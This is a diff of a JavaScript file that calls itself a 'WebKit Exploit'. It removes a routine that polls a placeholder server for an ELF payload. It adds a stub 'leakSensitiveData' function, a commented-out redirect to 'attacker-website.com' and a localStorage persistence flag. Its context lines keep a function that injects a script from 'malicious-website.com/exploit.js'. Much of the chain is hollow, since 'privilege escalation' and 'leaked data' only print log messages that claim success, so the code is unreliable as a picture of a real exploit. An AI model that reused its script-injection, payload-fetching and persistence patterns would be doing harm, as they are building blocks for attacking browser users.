@@ -52,7 +52,7 @@ document.addEventListener('DOMContentLoaded', function () {
     }
 
     log("WebKit Exploit started.");
-    
+
     function checkReadPrivilege() {
         let foo = 42;
         let readSuccess = false;
@@ -112,34 +112,15 @@ document.addEventListener('DOMContentLoaded', function () {
         return leak();
     }
 
-    function waitForPayload() {
-        log("Waiting for ELF payload...");
-
-        const serverUrl = "https://your-server-ip.com/receive-payload"; // Replace with your server URL that listens for the ELF payload
-
-        // Simulate polling for the ELF payload
-        setInterval(() => {
-            fetch(serverUrl, {
-                method: 'GET',
-                headers: { 'Accept': 'application/json' }
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.status === "success") {
-                    log("Payload received successfully.");
-                } else {
-                    log("Payload reception failed or not yet received.");
-                }
-            })
-            .catch(error => {
-                log(`Error fetching payload status: ${error.message}`);
-            });
-        }, 5000); // Poll every 5 seconds
+    function leakSensitiveData() {
+        let sensitiveData = "Sensitive data here";
+        log(`Leaked data: ${sensitiveData}`);
     }
 
     function escalatePrivileges() {
         log("Attempting privilege escalation.");
-        // No redirection code here anymore
+        // Comment out or remove the line causing redirection to stop it.
+        // window.location.href = "https://attacker-website.com";
         log("Privilege escalation complete without redirection.");
     }
 
@@ -148,6 +129,11 @@ document.addEventListener('DOMContentLoaded', function () {
         const script = document.createElement("script");
         script.src = "https://malicious-website.com/exploit.js";
         document.body.appendChild(script);
+    }
+
+    function persistExploit() {
+        log("Persisting exploit in localStorage.");
+        localStorage.setItem("exploit_persistent", "true");
     }
 
     function deliverPayload() {
@@ -185,12 +171,6 @@ document.addEventListener('DOMContentLoaded', function () {
             log("Read and/or write privileges failed. Exploit chain aborted.");
         }
     }
-
-    // Start waiting for the ELF payload
-    waitForPayload();
-
-    // Simulate the exploit chain running
-    exploitChain();
 
     // Limit the number of iterations for debugging purposes
     const MAX_ITERATIONS = 20; // Reduce the iterations for troubleshooting
